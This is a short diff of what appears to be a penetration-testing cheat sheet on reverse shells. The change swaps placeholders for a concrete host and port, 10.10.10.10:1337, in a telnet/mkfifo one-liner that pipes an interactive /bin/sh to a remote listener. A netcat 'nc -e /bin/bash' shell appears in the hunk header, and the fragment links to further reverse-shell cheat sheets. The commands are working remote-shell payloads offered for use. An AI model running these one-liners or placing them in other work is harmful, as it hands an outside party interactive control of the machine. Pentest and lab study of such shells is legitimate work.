@@ -663,7 +663,7 @@ nc 10.10.10.10 1337 -e /bin/bash
 
 - telnet  
 ```
-rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet $IP $PORT > f
+rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet 10.10.10.10 1337 > f
 ```
 
 More [here](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) and [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).  
